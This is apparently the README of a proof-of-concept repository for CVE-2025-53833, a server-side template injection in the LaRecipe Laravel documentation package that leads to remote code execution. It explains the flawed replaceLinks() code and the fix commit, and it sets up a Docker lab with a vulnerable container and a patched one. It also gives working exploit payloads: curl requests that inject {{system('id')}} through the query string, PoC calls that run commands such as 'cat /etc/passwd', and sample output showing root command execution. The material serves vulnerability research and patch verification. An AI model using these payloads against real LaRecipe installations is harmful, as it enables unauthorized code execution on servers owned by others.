# CVE-2025-53833 - LaRecipe Server-Side Template Injection to RCE

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field       | Value                                                |
|-------------|------------------------------------------------------|
| CVE         | CVE-2025-53833                                       |
| Component   | [BinaryTorch LaRecipe](https://github.com/saleem-hadad/larecipe) — Laravel documentation package |
| Type        | CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |
| CVSS        | 10.0 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| EPSS        | 32.2% (96.7th percentile)                           |
| Affected    | All versions before 2.8.1                            |
| Fix         | v2.8.1 — commit [`c1d0d56`](https://github.com/saleem-hadad/larecipe/commit/c1d0d56889655ce5f2645db5acf0e78d5fc3b36b) |
| Author      | Exploit Intelligence Platform |
| Date        | 2026-02-26                                           |
| Blog Post   | [Zero to RCE: Autonomous Exploit Development](https://exploit-intel.com/blog/posts/zero-to-rce-autonomous-exploit-development/) |

## Vulnerability Details

The vulnerability exists in `src/Models/Documentation.php` (line 100) within the `replaceLinks()` method:

```php
$content = str_replace('"#', '"'.request()->getRequestUri().'#', $content);
```

This method replaces anchor link references (`"#`) in rendered documentation HTML with fully-qualified links using the current request URI. The critical flaw is that `request()->getRequestUri()` returns the **raw HTTP request URI including the query string**, which is entirely attacker-controlled. The attacker-tainted content is then passed to `renderBlade()`, which compiles it with Laravel's Blade template engine via `Blade::compileString()` and executes the result with `eval('?'.'>'.$content)`.

Any Blade directives injected through the query string — such as `{{system('id')}}` or `@php system('id'); @endphp` — are compiled into PHP code and executed on the server. The default LaRecipe installation ships with documentation pages containing anchor links (the trigger condition), requires no authentication, and has caching disabled, making every default installation exploitable out of the box.

### Attack Chain

```
GET /docs/1.0/overview?{{system('id')}}
  → replaceLinks() injects raw URI (with query string) into HTML
    → renderBlade() → Blade::compileString() compiles {{ system('id') }}
      → eval() executes: <?php echo e(system('id')); ?>
        → RCE achieved — command output returned in HTTP response
```

### Fix (Commit c1d0d56)

```diff
--- a/src/Models/Documentation.php
+++ b/src/Models/Documentation.php
@@ -97,7 +97,7 @@
         $content = str_replace('{{route}}', trim(config('larecipe.docs.route'), '/'), $content);

-        $content = str_replace('"#', '"'.request()->getRequestUri().'#', $content);
+        $content = str_replace('"#', '"'.request()->getPathInfo().'#', $content);

         return $content;
     }
```

`getPathInfo()` returns only the path component (e.g., `/docs/1.0/overview`), completely excluding the attacker-controlled query string from content that reaches the template engine.

## Lab Setup

### Architecture

```
┌────────────────────────────┐         ┌────────────────────────────┐
│  cve-2025-53833-vulnerable │         │  cve-2025-53833-patched    │
│                            │         │                            │
│  LaRecipe v2.8.0           │         │  LaRecipe v2.8.1           │
│  getRequestUri() — VULN    │         │  getPathInfo() — FIXED     │
│  PHP 8.1 + Laravel 10.x   │         │  PHP 8.1 + Laravel 10.x   │
│  Port 8000 (ext 8081)     │         │  Port 8000 (ext 8082)     │
└────────────────────────────┘         └────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-53833

# Build and start
docker compose build
docker compose up -d

# Run the PoC against the vulnerable container
python3 poc/poc.py localhost 8081 id

# Verify the patched container blocks it
python3 poc/poc.py localhost 8082 id

# Manual verification with curl
curl -s --globoff "http://localhost:8081/docs/1.0/overview?{{system('id')}}" | grep -o 'uid=[^"]*'

# Cleanup
docker compose down
```

### Container Details

| Container | Role | LaRecipe Version | Host Port | Docs Endpoint |
|---|---|---|---|---|
| `cve-2025-53833-vulnerable` | Vulnerable target | **v2.8.0** (`getRequestUri()`) | `8081` | `http://localhost:8081/docs/1.0/overview` |
| `cve-2025-53833-patched` | Patched comparison | **v2.8.1** (`getPathInfo()`) | `8082` | `http://localhost:8082/docs/1.0/overview` |

Both containers run PHP 8.1 with Laravel 10.x and the Laravel built-in development server on port 8000 internally.

## PoC Usage

The PoC script (`poc/poc.py`) is a standalone Python 3 tool with **no external dependencies** (stdlib only). It uses raw TCP sockets to send Blade directives as literal bytes, bypassing URL encoding restrictions in modern HTTP libraries.

```bash
# Basic syntax
python3 poc/poc.py <target_host> <port> [command]

# Execute commands
python3 poc/poc.py localhost 8081 id
python3 poc/poc.py localhost 8081 whoami
python3 poc/poc.py localhost 8081 "uname -a"
python3 poc/poc.py localhost 8081 "cat /etc/passwd"
```

**Example output (vulnerable target):**

```
======================================================================
  CVE-2025-53833 — LaRecipe SSTI → RCE PoC
  Target: http://localhost:8081
  Command: id
======================================================================

[1] Checking target availability...
    [+] Target is up — HTTP 200, anchor links present

[2] Sending SSTI payload: {{system('id')}}
    URL: GET /docs/1.0/overview?{{system('id')}}

    [*] Response: HTTP 200

[3] Analyzing response for command output...
    [+] VULNERABLE! Command output extracted:

        uid=0(root) gid=0(root) groups=0(root)

    [+] Server-Side Template Injection confirmed — RCE achieved!
    [+] The Blade directive was compiled and eval()'d by PHP

[✓] RESULT: VULNERABLE — CVE-2025-53833 confirmed
```

### Manual Verification with curl

```bash
# RCE on vulnerable container (should return uid=0(root)...)
curl -s --globoff "http://localhost:8081/docs/1.0/overview?{{system('id')}}" | grep -o 'uid=[^"]*'

# phpinfo() for clean verification
curl -s --globoff "http://localhost:8081/docs/1.0/overview?{{phpinfo()}}" | grep 'PHP Version'

# Verify patched container blocks the exploit (no output expected)
curl -s --globoff "http://localhost:8082/docs/1.0/overview?{{system('id')}}" | grep -o 'uid=[^"]*'
```

> **Note:** The `--globoff` (`-g`) flag is required to prevent curl from interpreting `{` and `}` as glob patterns.

## Verification: Vulnerable vs Patched

| Command | Vulnerable (v2.8.0) | Patched (v2.8.1) |
|---|---|---|
| `id` | VULNERABLE — `uid=0(root) gid=0(root) groups=0(root)` | Blocked |
| `whoami` | VULNERABLE — `root` | Blocked |
| `uname -a` | VULNERABLE — `Linux ... 6.12.68-linuxkit` | Blocked |
| `hostname` | VULNERABLE — `5292653dd65c` | Blocked |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Standalone RCE exploit — zero dependencies, Python 3 stdlib only |
| `Dockerfile.vulnerable` | LaRecipe v2.8.0 container (vulnerable) |
| `Dockerfile.patched` | LaRecipe v2.8.1 container (patched) |
| `docker-compose.yml` | Lab with vulnerable + patched containers |
| `setup.sh` | Laravel project setup script used by Dockerfiles |
| `entrypoint.sh` | Container entrypoint (artisan serve) |
| `php-lab.ini` | PHP configuration for lab environment |

## References

- [Security Advisory (GHSA-jv7x-xhv2-p5v2)](https://github.com/saleem-hadad/larecipe/security/advisories/GHSA-jv7x-xhv2-p5v2)
- [Fix Commit c1d0d56](https://github.com/saleem-hadad/larecipe/commit/c1d0d56889655ce5f2645db5acf0e78d5fc3b36b)
- [Fix Pull Request #390](https://github.com/saleem-hadad/larecipe/pull/390)
- [LaRecipe Repository](https://github.com/saleem-hadad/larecipe)
- [Packagist Package](https://packagist.org/packages/binarytorch/larecipe)
- [Blog Post: Zero to RCE: Autonomous Exploit Development](https://exploit-intel.com/blog/posts/zero-to-rce-autonomous-exploit-development/)

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-53833 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
